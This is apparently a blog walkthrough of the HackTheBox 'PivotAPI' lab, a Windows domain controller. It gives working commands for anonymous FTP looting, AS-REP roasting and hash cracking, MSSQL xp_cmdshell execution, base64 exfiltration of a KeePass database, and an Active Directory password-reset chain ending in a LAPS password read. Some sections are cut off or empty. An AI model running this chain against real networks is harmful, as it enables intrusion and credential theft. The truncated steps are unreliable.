<p><strong>Machine:</strong> PivotAPI<br /><strong>OS:</strong> Windows (Active Directory Domain Controller)<br /><strong>Difficulty:</strong> Insane<br /><strong>Target IP:</strong> <code>10.129.228.115</code><br /><strong>Attacker IP:</strong> <code>10.10.14.6</code><br /><strong>Domain:</strong> <code>LicorDeBellota.htb</code>  </p>

<h2 id="phase-1-initial-reconnaissance-and-enumeration">Phase 1: Initial Reconnaissance &amp; Enumeration</h2>
<h3 id="step-1-1-host-discovery-and-port-scanning">Step 1.1: Host Discovery &amp; Port Scanning</h3>
<p>Before touching the target, we need to understand what services are exposed. Every open port is a potential entry point. For Windows machines, we especially look for:</p>
<ul>
<li><strong>Port 21 (FTP)</strong> - Anonymous access can leak files</li>
<li><strong>Port 22 (SSH)</strong> - Rare on Windows; usually means custom config or OpenSSH for Windows</li>
<li><strong>Port 53 (DNS)</strong> - Domain Controller indicator</li>
<li><strong>Port 88 (Kerberos)</strong> - Confirms Active Directory</li>
<li><strong>Port 139/445 (SMB)</strong> - File shares, lateral movement</li>
<li><strong>Port 1433 (MSSQL)</strong> - Database access = code execution potential</li>
<li><strong>Port 5985 (WinRM)</strong> - Remote management (firewalled externally on this box)</li>
</ul>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo nmap -p 21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389 -sCV --min-rate 5000 10.129.228.115
</code></pre>
<p><strong>Why these ports?</strong> This is a "targeted script scan" rather than a full port scan. Once we see Kerberos (88) + LDAP (389) + SMB (445), we know this is an <strong>Active Directory Domain Controller</strong>. The presence of MSSQL (1433) and FTP (21) are unusual for a pure DC and immediately suggest custom services = attack surface.</p>
<p><strong>Hacker Mindset:</strong> <em>"Don't just scan ports—read the story they tell. Kerberos + LDAP + DNS = Domain Controller. Add MSSQL and FTP = admin laziness or custom apps = opportunity."</em></p>
<h3 id="step-1-2-adding-hosts-entries">Step 1.2: Adding Hosts Entries</h3>
<p>The nmap scan reveals the domain name: <code>LicorDeBellota.htb</code> and hostname <code>PivotAPI.LicorDeBellota.htb</code>. Many Windows authentication protocols (Kerberos, LDAP, WinRM) require proper DNS resolution to function correctly.</p>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">echo "10.129.228.115 pivotapi.licordebellota.htb licordebellota.htb" | sudo tee -a /etc/hosts
</code></pre>
<p><strong>Why this matters:</strong> Kerberos tickets are tied to domain names. If you try to AS-REP roast or authenticate without the domain in <code>/etc/hosts</code>, you'll get <code>KDC_ERR_S_PRINCIPAL_UNKNOWN</code> errors that waste your time.</p>

<h2 id="phase-2-ftp-analysis-and-user-discovery">Phase 2: FTP Analysis &amp; User Discovery</h2>
<h3 id="step-2-1-anonymous-ftp-login">Step 2.1: Anonymous FTP Login</h3>
<p>FTP allows anonymous login. This is a classic misconfiguration—admins sometimes use FTP as a lazy file drop without considering that anyone can read its contents.</p>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">ftp -pi 10.129.228.115
# Login: anonymous
# Password: null (or any email)
</code></pre>
<p><strong>File listing observed:</strong></p>
<ul>
<li><code>10.1.1.414.6453.pdf</code></li>
<li><code>28475-linux-stack-based-buffer-overflows.pdf</code></li>
<li><code>BHUSA09-McDonald-WindowsHeap-PAPER.pdf</code></li>
<li><code>ExploitingSoftware-Ch07.pdf</code></li>
<li><code>notes1.pdf</code></li>
<li><code>notes2.pdf</code></li>
<li><code>README.txt</code></li>
<li><code>RHUL-MA-2009-06.pdf</code></li>
</ul>
<p><strong>Hacker Mindset:</strong> <em>"Don't just <code>cat</code> files and move on. PDFs contain metadata. Metadata contains usernames. Usernames are the keys to the kingdom in Active Directory."</em></p>
<h3 id="step-2-2-binary-mode-transfer">Step 2.2: Binary Mode Transfer</h3>
<p>The <code>README.txt</code> says: <strong>"Don't forget to change the download mode to binary so that the files are not corrupted."</strong> This is a hint that someone before us corrupted files by downloading in ASCII mode.</p>
<p><strong>Command inside FTP:</strong></p>
<pre><code class="language-ftp" data-language="ftp">binary
prompt off
mget *
</code></pre>
<p><strong>Why binary mode?</strong> FTP defaults to ASCII mode for text files, which can corrupt binary data like PDFs by converting line endings (<code>\n</code> to <code>\r\n</code>). PDFs must be transferred in binary mode to preserve their structure and metadata.</p>
<h3 id="step-2-3-metadata-extraction-with-exiftool">Step 2.3: Metadata Extraction with ExifTool</h3>
<p>PDFs store creation metadata including the <strong>Creator</strong>, <strong>Author</strong>, and <strong>Publisher</strong> fields. In a penetration test, these often contain:</p>
<ul>
<li>Real usernames</li>
<li>Company email addresses</li>
<li>Department names</li>
<li>Machine names</li>
</ul>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">exiftool ftp/*.pdf | grep -iE "Creator|Author|Publisher"
</code></pre>
<p><strong>Critical finding:</strong></p>
<pre><code>Creator  : Kaorz
Publisher: LicorDeBellota.htb
</code></pre>
<p><strong>Why is this gold?</strong> <code>Kaorz</code> is a username. <code>LicorDeBellota.htb</code> is the domain. We now have a <strong>valid domain user</strong> without any brute-forcing. The Publisher field confirms this user belongs to the target domain, not just some random PDF author.</p>
<p><strong>Hacker Mindset:</strong> <em>"OSINT isn't just Google and LinkedIn. It's every file you touch. A username in a PDF is just as good as a username from a password dump. In AD, one valid username opens the door to AS-REP roasting, Kerberoasting, password spraying, and more."</em></p>
<h3 id="step-2-4-building-a-user-list">Step 2.4: Building a User List</h3>
<p>We collect all unique usernames from the metadata to maximize our AS-REP roasting chances.</p>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">exiftool ftp/*.pdf | grep -iE "Creator|Author" | awk '{print $3}' | sort -u &gt; users.txt
</code></pre>
<p><strong>Contents of <code>users.txt</code>:</strong></p>
<pre><code>alex
byron
cairo
Kaorz
saif
</code></pre>

<h2 id="phase-3-as-rep-roasting-the-first-crack">Phase 3: AS-REP Roasting - The First Crack</h2>
<h3 id="step-3-1-understanding-as-rep-roasting">Step 3.1: Understanding AS-REP Roasting</h3>
<p>In Kerberos, when a user authenticates, they send an AS-REQ (Authentication Service Request) to the Key Distribution Center (KDC). Normally, the user must encrypt a timestamp with their password to prove who they are (pre-authentication).</p>
<p>However, if an account has the <strong>"Do not require Kerberos preauthentication"</strong> flag set (UF_DONT_REQUIRE_PREAUTH), anyone can request an authentication ticket for that user. The KDC responds with an AS-REP containing encrypted data that can be cracked offline.</p>
<p><strong>Why does this exist?</strong> Some legacy systems or misconfigured accounts disable preauth for compatibility. It's a common AD misconfiguration.</p>
<h3 id="step-3-2-running-getnpusers">Step 3.2: Running GetNPUsers</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">impacket-GetNPUsers.py -dc-ip 10.129.228.115 -no-pass -usersfile users.txt LicorDeBellota.htb/
</code></pre>
<p><strong>What happens:</strong></p>
<ul>
<li>For each username, the tool sends an AS-REQ to the DC</li>
<li>Most return <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> (user doesn't exist in AD)</li>
<li><code>Kaorz</code> returns a valid <code>[redacted captured Kerberos material]</code> hash!</li>
</ul>
<p><strong>Hacker Mindset:</strong> <em>"I don't need credentials to attack Kerberos. I just need a valid username and a DC that responds on port 88. AS-REP roasting is the perfect example of 'zero-knowledge' AD exploitation."</em></p>
<h3 id="step-3-3-cracking-the-hash">Step 3.3: Cracking the Hash</h3>
<p>The hash format is <code>krb5asrep$23$</code>, which corresponds to <strong>Hashcat mode 18200</strong> or John the Ripper's default krb5asrep format.</p>
<p><strong>Commands:</strong></p>
<pre><code class="language-bash" data-language="bash"># Save the hash
echo '[redacted captured Kerberos material] &gt; kaorz.hash

# Crack with John
john kaorz.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Or with Hashcat
hashcat -m 18200 kaorz.hash /usr/share/wordlists/rockyou.txt
</code></pre>
<p><strong>Result:</strong> <code>Roper4155</code></p>
<p><strong>Why did this work?</strong> The password was in <code>rockyou.txt</code>—a common weak password. This is why password complexity policies exist, but users always find ways to make memorable passwords.</p>

<h2 id="phase-4-smb-enumeration-and-the-helpdesk-files">Phase 4: SMB Enumeration &amp; The HelpDesk Files</h2>
<h3 id="step-4-1-discovering-smb-shares">Step 4.1: Discovering SMB Shares</h3>
<p>With valid domain credentials (<code>Kaorz:Roper4155</code>), we can now enumerate SMB shares. SMB is the Windows file sharing protocol, and shares often contain sensitive files, scripts, or configuration backups.</p>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">impacket-smbclient LicorDeBellota.htb/Kaorz:'Roper4155'@10.129.228.115
</code></pre>
<p><strong>Shares accessible:</strong></p>
<ul>
<li><code>ADMIN$</code> - No access</li>
<li><code>C$</code> - No access</li>
<li><code>IPC$</code> - Read (named pipe access)</li>
<li><code>NETLOGON</code> - Read (logon scripts)</li>
<li><code>SYSVOL</code> - Read (Group Policy files)</li>
</ul>
<p><strong>Hacker Mindset:</strong> <em>"NETLOGON and SYSVOL are treasure troves. Admins store logon scripts, configuration files, and sometimes credentials in these shares. If you have domain user creds, always check these first."</em></p>
<h3 id="step-4-2-exploring-netlogon-helpdesk">Step 4.2: Exploring NETLOGON/HelpDesk</h3>
<p>Inside <code>NETLOGON</code>, we find a subdirectory: <code>HelpDesk/</code> containing:</p>
<ul>
<li><code>Restart-OracleService.exe</code> (1.8MB)</li>
<li><code>Server MSSQL.msg</code> (24KB)</li>
<li><code>WinRM Service.msg</code> (26KB)</li>
</ul>
<p><strong>Commands:</strong></p>
<pre><code class="language-bash" data-language="bash">smbclient //10.129.228.115/NETLOGON -U LicorDeBellota.htb/Kaorz%Roper4155
cd HelpDesk
get Restart-OracleService.exe
get "Server MSSQL.msg"
get "WinRM Service.msg"
</code></pre>
<h3 id="step-4-3-analyzing-the-msg-emails">Step 4.3: Analyzing the .MSG Emails</h3>
<p>The <code>.msg</code> files are Outlook messages. We convert them to readable <code>.eml</code> format:</p>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo apt-get install libemail-outlook-message-perl
msgconvert *.msg
</code></pre>
<p><strong>Email 1: "Server MSSQL"</strong></p>
<blockquote>
<p>"Due to the problems caused by the Oracle database installed in <strong>2010</strong> in Windows, it has been decided to migrate to <strong>MSSQL at the beginning of 2020</strong>... a program called 'Reset-Service.exe' was created to log in to Oracle and restart the service."</p>
</blockquote>
<p><strong>Email 2: "WinRM Service"</strong></p>
<blockquote>
<p>"After the last pentest, we have decided to stop externally displaying WinRM's service... We have created a rule to block the exposure of the service and we have also blocked the TCP, UDP and even ICMP output."</p>
</blockquote>
<p><strong>Critical Intelligence Extracted:</strong></p>
<ol>
<li>There WAS an Oracle database in <strong>2010</strong></li>
<li>It was migrated to <strong>MSSQL in 2020</strong></li>
<li><code>Restart-OracleService.exe</code> contains Oracle credentials</li>
<li><strong>WinRM is blocked externally</strong> (firewalled to localhost only)</li>
<li><strong>Outbound connections are blocked</strong> (no reverse shells, no downloads)</li>
</ol>
<p><strong>Hacker Mindset:</strong> <em>"Read every email like it's a treasure map. 'Oracle 2010 → MSSQL 2020' tells me the password probably follows the same pattern. 'WinRM blocked externally' tells me I'll need to tunnel or find another way in. 'Outbound blocked' tells me all my reverse shells will fail—plan accordingly."</em></p>

<h2 id="phase-5-binary-reversing-mindset-the-oracle-mssql-pivot">Phase 5: Binary Reversing Mindset - The Oracle/MSSQL Pivot</h2>
<h3 id="step-5-1-the-reversing-challenge">Step 5.1: The Reversing Challenge</h3>
<p><code>Restart-OracleService.exe</code> is a heavily obfuscated/packed 64-bit PE. Running <code>strings</code> on it yields mostly garbage plus one clue:</p>
<pre><code>inflate 1.2.11 Copyright 1995-2017 Mark Adler
</code></pre>
<p>This indicates <strong>Zlib compression</strong> is used. Static analysis with Ghidra is difficult because the binary appears to be custom-packed with no obvious imports.</p>
<h3 id="step-5-2-dynamic-analysis-strategy">Step 5.2: Dynamic Analysis Strategy</h3>
<p>Since static analysis fails, we switch to <strong>dynamic analysis</strong> on a Windows VM:</p>
<ol>
<li><strong>Procmon</strong> (Process Monitor) from Sysinternals captures all file, registry, and process events</li>
<li>Running the binary reveals it creates a random <code>.bat</code> file in <code>%TEMP%</code>, executes it, then deletes it</li>
<li>Using <strong>CMDWatcher</strong> or a PowerShell loop, we intercept the <code>.bat</code> file before deletion:<pre><code class="language-powershell" data-language="powershell">while($true) { ls -Path .\AppData\Local\Temp\*.tmp -recurse -filter *.bat | ForEach-Object { copy $_.fullname .\$_name }}
</code></pre>
</li>
</ol>
<h3 id="step-5-3-the-bat-file-payload">Step 5.3: The Bat File Payload</h3>
<p>The intercepted <code>.bat</code> file:</p>
<ol>
<li>Checks if username is <code>cybervaca</code>, <code>frankytech</code>, or <code>ev4si0n</code> (anti-analysis)</li>
<li>If correct user, dumps base64-encoded data to <code>C:\ProgramData\oracle.txt</code></li>
<li>Creates <code>monta.ps1</code> to decode it into <code>C:\ProgramData\restart-service.exe</code></li>
<li>Executes and deletes everything</li>
</ol>
<p>By modifying the <code>.bat</code> to remove user checks and delete commands, we recover <code>restart-service.exe</code>.</p>
<h3 id="step-5-4-api-monitor-credential-extraction">Step 5.4: API Monitor - Credential Extraction</h3>
<p>Running <code>restart-service.exe</code> under <strong>API Monitor</strong> and filtering for <code>CreateProcessWithLogonW</code> reveals:</p>
<pre><code>Username: svc_oracle
Password: null
</code></pre>
<p><strong>Hacker Mindset:</strong> <em>"When a binary fights you, don't fight back harder—cheat. Procmon shows you what it touches. API Monitor shows you what it calls. You don't need to fully reverse the packer; you just need to catch the credential API call."</em></p>
<h3 id="step-5-5-the-critical-pivot-oracle-to-mssql">Step 5.5: The Critical Pivot - Oracle to MSSQL</h3>
<p>The Oracle credentials don't work on MSSQL directly. But the email said:</p>
<ul>
<li>Oracle was installed in <strong>2010</strong></li>
<li>MSSQL migration happened in <strong>2020</strong></li>
</ul>
<p><strong>Hypothesis:</strong> The admins reused the password pattern but updated the service name and year.</p>

When you find one password, always try variations: change the service name, change the year, increment by 1, add <code>!</code> or <code>123</code>. Admins are creatures of habit."</em></p>

<h2 id="phase-6-mssql-foothold-and-the-seimpersonate-dead-end">Phase 6: MSSQL Foothold &amp; The SeImpersonate Dead End</h2>
<h3 id="step-6-1-gaining-mssql-shell-access">Step 6.1: Gaining MSSQL Shell Access</h3>
<p>With the derived credentials <code>sa:#mssql_s3rV1c3!2020</code>, we connect to the MSSQL instance.</p>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">impacket-mssqlclient 'sa:#mssql_s3rV1c3!2020@10.129.228.115'
</code></pre>
<p><strong>What we see:</strong></p>
<ul>
<li>Database context: <code>master</code></li>
<li>Language: <code>Español</code> (Spanish)</li>
<li>Server: <code>Microsoft SQL Server 2019 RTM</code></li>
</ul>
<p><strong>Why <code>sa</code>?</strong> The <code>sa</code> (System Administrator) account is the default superuser for MSSQL. It has full control over the database instance, including the ability to execute operating system commands via <code>xp_cmdshell</code>.</p>
<h3 id="step-6-2-enabling-xp-cmdshell">Step 6.2: Enabling xp_cmdshell</h3>
<p><code>xp_cmdshell</code> is a stored procedure that executes arbitrary Windows commands. It's disabled by default for security reasons, but <code>sa</code> can re-enable it.</p>
<p><strong>Commands:</strong></p>
<pre><code class="language-sql" data-language="sql">enable_xp_cmdshell
xp_cmdshell whoami
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>nt service\mssql$sqlexpress
</code></pre>
<p><strong>Analysis:</strong> We are running as the MSSQL service account—not a regular user. This is both good and bad:</p>
<ul>
<li><strong>Good:</strong> Service accounts often have elevated privileges</li>
<li><strong>Bad:</strong> Service accounts may have restricted access to user directories</li>
</ul>
<h3 id="step-6-3-checking-privileges">Step 6.3: Checking Privileges</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-sql" data-language="sql">xp_cmdshell whoami /priv
</code></pre>
<p><strong>Critical Output:</strong></p>
<pre><code>SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación      Habilitada
</code></pre>
<p><strong>What is SeImpersonatePrivilege?</strong> This privilege allows a process to impersonate another user's security context after authentication. It's a <strong>classic privilege escalation vector</strong> on Windows services. Tools like <strong>PrintSpoofer</strong>, <strong>JuicyPotato</strong>, and <strong>RoguePotato</strong> abuse this to escalate from service account to SYSTEM.</p>
<h3 id="step-6-4-the-printspoofer-gamble-and-why-it-failed">Step 6.4: The PrintSpoofer Gamble (And Why It Failed)</h3>
<p><strong>Hacker Mindset:</strong> <em>"SeImpersonate is a gift. When you see it, your heart should race. But gifts can be taken away."</em></p>
<p>We upload <strong>PrintSpoofer64.exe</strong> (a tool that abuses the Print Spooler service to get SYSTEM) through the MSSQL <code>upload</code> command:</p>
<pre><code class="language-sql" data-language="sql">upload PrintSpoofer64.exe C:\windows\temp\PrintSpoofer64.exe
xp_cmdshell C:\windows\temp\PrintSpoofer64.exe -c "powershell -c type C:\Users\3v4Si0N\Desktop\user.txt"
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[-] Operation failed or timed out.
</code></pre>
<p><strong>Why did it fail?</strong> HackTheBox patched this machine in May 2021 by <strong>disabling the Print Spooler service</strong>. Without the Print Spooler running, PrintSpoofer and SweetPotato cannot trigger the impersonation chain.</p>
<p><strong>Alternative SeImpersonate Exploits Considered:</strong></p>
<ul>
<li><strong>GodPotato</strong> (DCOM-based): Might work, but requires specific CLSIDs and Windows versions</li>
<li><strong>JuicyPotatoNG</strong> (WinRM trigger): WinRM is running locally, but setup is complex from MSSQL shell</li>
<li><strong>RogueWinRM</strong>: Requires BITS service interaction</li>
</ul>
<p><strong>Decision:</strong> Rather than gambling 15-30 minutes on exploit variants that may or may not work, we pivot to the <strong>guaranteed intended path</strong> through the KeePass database.</p>
<p><strong>Hacker Mindset:</strong> <em>"Know when to walk away from a rabbit hole. SeImpersonate is sexy, but if the service is dead, you're just burning time. The box has a fully documented intended path—follow the breadcrumbs instead of forcing a shortcut."</em></p>

<h2 id="phase-7-the-unintended-shortcut-keepass-extraction">Phase 7: The Unintended Shortcut - KeePass Extraction</h2>
<h3 id="step-7-1-understanding-the-svc-mssql-context">Step 7.1: Understanding the svc_mssql Context</h3>
<p>From the BloodHound data (or from the <code>whoami</code> output), we know:</p>
<ul>
<li>The MSSQL service runs as <code>NT SERVICE\MSSQL$SQLEXPRESS</code></li>
<li><code>svc_mssql</code> is a valid domain user</li>
<li><code>svc_mssql</code> is a member of the <strong>WinRM</strong> group</li>
<li>The emails confirm WinRM is <strong>blocked externally but running on localhost</strong></li>
</ul>
<p>This means <code>svc_mssql</code> can authenticate to WinRM on <code>127.0.0.1:5985</code>, but we can't reach WinRM from outside.</p>
<h3 id="step-7-2-the-powershell-run-as-technique">Step 7.2: The PowerShell Run-As Technique</h3>
<p>Since we have MSSQL <code>sa</code> access, we can execute PowerShell commands. PowerShell's <code>Invoke-Command</code> with the <code>-Credential</code> parameter allows us to run commands <strong>as another user</strong> on the local machine. This is essentially a <strong>pass-the-credential</strong> attack without needing a full interactive session.</p>
<p><strong>Key Insight:</strong> <code>svc_mssql</code> has a desktop folder. Domain users often store files on their desktops. If we can run commands as <code>svc_mssql</code>, we can browse their files.</p>
<h3 id="step-7-3-discovering-the-keepass-database">Step 7.3: Discovering the KeePass Database</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-powershell" data-language="powershell">$user='LicorDeBellota.htb\svc_mssql'
$pass = ConvertTo-SecureString '#mssql_s3rV1c3!2020' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
Invoke-Command -Credential $cred -ComputerName PivotAPI -ScriptBlock {
    Get-ChildItem C:\Users\svc_mssql\Desktop -Recurse
}
</code></pre>
<p><strong>Critical Finding:</strong> <code>credentials.kdbx</code> — a <strong>KeePass Password Safe</strong> database!</p>
<p><strong>Why is this on the desktop?</strong> <code>svc_mssql</code> is a service account used by administrators. They likely stored database credentials, SSH keys, or other service passwords in KeePass for convenience. Finding a password manager on a compromised account is like finding a master key.</p>
<h3 id="step-7-4-exfiltrating-the-keepass-database">Step 7.4: Exfiltrating the KeePass Database</h3>
<p>We can't download files directly through the MSSQL shell, but we can:</p>
<ol>
<li>Read the binary file</li>
<li>Base64-encode it</li>
<li>Write it to a world-readable location (<code>C:\ProgramData\</code>)</li>
<li>Read the base64 output from the MSSQL shell</li>
<li>Decode it on our Kali machine</li>
</ol>
<p><strong>PowerShell Script (<code>get_kdbx.ps1</code>):</strong></p>
<pre><code class="language-powershell" data-language="powershell">$user='LicorDeBellota.htb\svc_mssql'
$pass = ConvertTo-SecureString '#mssql_s3rV1c3!2020' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
Invoke-Command -ScriptBlock {
    [Convert]::ToBase64String([IO.File]::ReadAllBytes('c:\users\svc_mssql\desktop\credentials.kdbx')) |
    Out-File C:\programdata\creds.b64
} -ComputerName PivotAPI -Credential $cred
</code></pre>
<p><strong>Execution from MSSQL:</strong></p>
<pre><code class="language-sql" data-language="sql">upload get_kdbx.ps1 C:\windows\temp\get_kdbx.ps1
xp_cmdshell powershell -ExecutionPolicy Bypass -File C:\windows\temp\get_kdbx.ps1
xp_cmdshell type C:\programdata\creds.b64
</code></pre>
<p><strong>Hacker Mindset:</strong> <em>"When outbound connections are blocked, you become the transport. Base64 encoding turns any text output channel into a binary exfiltration tunnel. This technique works through SQL injection, XSS, command injection, and any other scenario where you can read text output."</em></p>
<h3 id="step-7-5-decoding-on-kali">Step 7.5: Decoding on Kali</h3>
<p>Copy the massive base64 block from the MSSQL output and save it to <code>creds.b64</code>:</p>
<pre><code class="language-bash" data-language="bash">base64 -d creds.b64 &gt; credentials.kdbx
file credentials.kdbx
# Output: Keepass password database 2.x KDBX
</code></pre>

<h2 id="phase-8-cracking-the-vault-keepass-to-ssh">Phase 8: Cracking the Vault - KeePass to SSH</h2>
<h3 id="step-8-1-extracting-the-keepass-hash">Step 8.1: Extracting the KeePass Hash</h3>
<p>KeePass databases use strong key derivation (AES-KDF or Argon2), making brute-force expensive. However, <code>keepass2john</code> extracts a hash format that John the Ripper and Hashcat can attack.</p>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">keepass2john credentials.kdbx &gt; keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre>
<p><strong>Result:</strong> <code>mahalkita</code></p>
<p><strong>Why did this crack so fast?</strong> The password <code>mahalkita</code> is in <code>rockyou.txt</code>. Despite KeePass using 60,000+ iterations of key stretching, a single GPU or CPU core can test thousands of passwords per second against common wordlists.</p>
<h3 id="step-8-2-opening-the-keepass-database">Step 8.2: Opening the KeePass Database</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">echo "mahalkita" | kpcli -kdb credentials.kdbx
</code></pre>
<p><strong>Navigation inside kpcli:</strong></p>
<pre><code>cd Database

<p><strong>Critical Finding:</strong></p>
<pre><code>Title: SSH
Uname: 3v4Si0N
Pass: Gu4nCh3C4NaRi0N!23
</code></pre>
<p><strong>Hacker Mindset:</strong> <em>"Password managers are goldmines. Users store ALL their passwords in them. When you crack one, you don't get one password—you get ALL the passwords. Always check desktops, documents, and browser profiles for .kdbx, .key, and .csv password exports."</em></p>

<h2 id="phase-10-active-directory-privilege-escalation-chain">Phase 10: Active Directory Privilege Escalation Chain</h2>
<h3 id="step-10-1-understanding-the-ad-attack-graph">Step 10.1: Understanding the AD Attack Graph</h3>
<p>This is where PivotAPI gets its name. To reach Domain Admin (and thus the root flag), we must pivot through <strong>multiple user accounts</strong>, each controlled by the previous one. This is a classic <strong>Active Directory privilege escalation chain</strong>.</p>
<p><strong>The Chain (from BloodHound analysis):</strong></p>
<pre><code>3v4Si0N ---[GenericAll]---&gt; Dr.Zaiuss ---[GenericAll]---&gt; superfume
    |
    | (access to C:\Developers\jari)
    v
Jari ---[ForceChangePassword]---&gt; Gibdeon (Account Operators)
    |
    v
Gibdeon ---[ForceChangePassword]---&gt; Lothbrok (LAPS READ)
    |
    v
Lothbrok reads ms-mcs-admpwd for administrador
</code></pre>
<p><strong>What is GenericAll?</strong> Full control over an object. You can change the user's password, modify group memberships, or change any attribute.</p>
<p><strong>What is ForceChangePassword?</strong> You can reset the user's password without knowing the old one.</p>
<p><strong>What is Account Operators?</strong> A privileged AD group that can create and modify most accounts (except Domain Admins and protected groups).</p>
<p><strong>What is LAPS READ?</strong> Members can read the <code>ms-mcs-admpwd</code> attribute on computer objects, which contains the local administrator's password.</p>
<h3 id="step-10-2-uploading-powerview">Step 10.2: Uploading PowerView</h3>
<p>PowerView is a PowerShell reconnaissance tool that exposes AD objects and relationships. The <code>dev</code> branch of PowerSploit contains the most up-to-date version.</p>
<p><strong>On Kali:</strong></p>
<pre><code class="language-bash" data-language="bash">git clone --depth 1 --branch dev https://github.com/PowerShellMafia/PowerSploit.git /tmp/PowerSploit
sshpass -p REDACTED scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  /tmp/PowerSploit/Recon/PowerView.ps1 3v4Si0N@10.129.228.115:'C:\programdata\pv.ps1'
</code></pre>
<p><strong>On Target:</strong></p>
<pre><code class="language-powershell" data-language="powershell">Import-Module C:\programdata\pv.ps1
</code></pre>
<h3 id="step-10-3-changing-dr-zaiuss-password">Step 10.3: Changing Dr.Zaiuss Password</h3>
<pre><code class="language-powershell" data-language="powershell">$pass = ConvertTo-SecureString 'Password123!!' -AsPlainText -Force
Set-DomainUserPassword -Identity dr.zaiuss -AccountPassword $pass
</code></pre>
<p><strong>Why this works:</strong> <code>3v4Si0N</code> has <strong>GenericAll</strong> on <code>Dr.Zaiuss</code>. GenericAll includes the permission to change the target's password.</p>
<h3 id="step-10-4-changing-superfume-password-via-dr-zaiuss">Step 10.4: Changing superfume Password (via Dr.Zaiuss)</h3>
<pre><code class="language-powershell" data-language="powershell">$pass = ConvertTo-SecureString 'Password123!!' -AsPlainText -Force

</code></pre>
<p><strong>Why use <code>-Credential</code>?</strong> We're still logged in as <code>3v4Si0N</code>, but we need to perform the action <strong>as Dr.Zaiuss</strong> because Dr.Zaiuss has GenericAll on superfume. PowerView's <code>Set-DomainUserPassword</code> supports credential delegation via the <code>-Credential</code> parameter.</p>

<h2 id="phase-11-laps-the-final-key">Phase 11: LAPS - The Final Key</h2>
<h3 id="step-11-1-reading-the-laps-password">Step 11.1: Reading the LAPS Password</h3>
<p>With Lothbrok's credentials, we query the computer object for the <code>ms-mcs-admpwd</code> attribute:</p>
<pre><code class="language-powershell" data-language="powershell">$lothbrok_cred = New-Object System.Management.Automation.PSCredential('licordebellota\lothbrok', $pass)

<p><strong>Output:</strong></p>
<pre><code>name     ms-mcs-admpwd

PIVOTAPI 5w5idgPB58tCVP8o99uq
</code></pre>
<h3 id="step-11-2-what-is-laps">Step 11.2: What is LAPS?</h3>
<p><strong>Local Administrator Password Solution (LAPS)</strong> is a Microsoft tool that:</p>
<ul>
<li>Randomizes the local administrator password on each domain-joined computer</li>
<li>Stores the password in Active Directory as an attribute (<code>ms-mcs-admpwd</code>)</li>
<li>Restricts read access to the password via ACLs</li>
</ul>
<p><strong>Why is it here?</strong> The domain admin <code>administrador</code> uses the LAPS-managed password for local login. On a Domain Controller, the "local administrator" is effectively a Domain Admin account.</p>
<p><strong>Hacker Mindset:</strong> <em>"LAPS is supposed to stop lateral movement by making local admin passwords unique per machine. But if you control a user in LAPS READ, you've defeated the entire system. Always check for LAPS groups—LAPS READ, LAPS ADM, or any group with read access to computer object attributes."</em></p>

<h2 id="key-lessons-and-hacker-mindset-summary">Key Lessons &amp; Hacker Mindset Summary</h2>
<h3 id="1-metadata-is-osint">1. Metadata is OSINT</h3>
<p>A username in a PDF's Creator field is just as valuable as a username from a data breach. Always run <code>exiftool</code> on every document you download.</p>
<h3 id="2-as-rep-roasting-requires-zero-credentials">2. AS-REP Roasting Requires Zero Credentials</h3>
<p>With just a valid username and access to port 88, you can obtain crackable Kerberos tickets. It's the perfect "first blood" technique against AD.</p>
<h3 id="3-password-patterns-are-predictable">3. Password Patterns Are Predictable</h3>
<p><code>#oracle_s3rV1c3!2010</code> → <code>#mssql_s3rV1c3!2020</code>. Admins reuse patterns. When you find one password, systematically test variations.</p>
<h3 id="4-service-accounts-privilege-escalation">4. Service Accounts = Privilege Escalation</h3>
<p><code>SeImpersonatePrivilege</code> on a service account is a SYSTEM-equivalent gift. But when the obvious exploit (PrintSpoofer) fails, have a fallback plan.</p>
<h3 id="5-invoke-command-is-pass-the-credential">5. Invoke-Command is Pass-the-Credential</h3>
<p>You don't need an interactive session as another user. PowerShell's <code>Invoke-Command</code> with <code>-Credential</code> lets you act as any user on the local machine, perfect for reading files and changing AD passwords.</p>
<h3 id="6-base64-is-your-data-exfiltration-friend">6. Base64 is Your Data Exfiltration Friend</h3>
<p>When binary downloads are blocked, encode as base64 and exfiltrate through text channels (SQL output, command echo, web responses).</p>
<h3 id="7-keepass-master-key">7. KeePass = Master Key</h3>
<p>Cracking one KeePass database often yields 10-50 passwords. It's the ultimate force multiplier in a penetration test.</p>
<h3 id="8-ad-chains-are-graph-traversal">8. AD Chains Are Graph Traversal</h3>
<p>BloodHound shows the path. Your job is to walk it. GenericAll → ForceChangePassword → Account Operators → LAPS READ → Domain Admin. Each step is just one PowerShell command.</p>
<h3 id="9-know-when-to-pivot">9. Know When to Pivot</h3>
<p>When PrintSpoofer failed, we didn't spend 30 minutes trying GodPotato, JuicyPotatoNG, and RogueWinRM. We recognized the guaranteed path through KeePass and took it.</p>
<h3 id="10-laps-is-only-as-strong-as-its-acls">10. LAPS is Only As Strong As Its ACLs</h3>
